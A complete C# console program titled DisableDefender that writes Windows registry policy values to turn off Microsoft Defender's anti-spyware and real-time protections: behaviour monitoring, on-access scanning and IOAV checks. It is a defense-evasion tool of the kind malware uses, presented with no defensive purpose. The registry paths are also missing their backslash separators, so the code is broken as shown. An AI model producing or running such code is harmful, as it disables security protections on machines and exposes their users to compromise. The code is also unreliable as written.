using Microsoft.Win32;
using System;

namespace DisableDefender
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string baseKey = @"SOFTWAREPoliciesMicrosoftWindows Defender";
                string rtpKey = baseKey + @"Real-Time Protection";

                // Open or create base key
                using (RegistryKey key = Registry.LocalMachine.CreateSubKey(baseKey))
                {
                    if (key == null)
                    {
                        Console.WriteLine("Failed to open base registry key.");
                        return;
                    }
                    key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
                }

                // Open or create Real-Time Protection key
                using (RegistryKey keyRtp = Registry.LocalMachine.CreateSubKey(rtpKey))
                {
                    if (keyRtp == null)
                    {
                        Console.WriteLine("Failed to open Real-Time Protection registry key.");
                        return;
                    }

                    keyRtp.SetValue("DisableBehaviourMonitoring", 1, RegistryValueKind.DWord);
                    keyRtp.SetValue("DisableOnAccessProtection", 1, RegistryValueKind.DWord);
                    keyRtp.SetValue("DisableScanOnRealTimeEnable", 1, RegistryValueKind.DWord);
                    keyRtp.SetValue("DisableIOAVPProtection", 1, RegistryValueKind.DWord);
                }

                Console.WriteLine("Registry keys successfully set.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }
    }
}
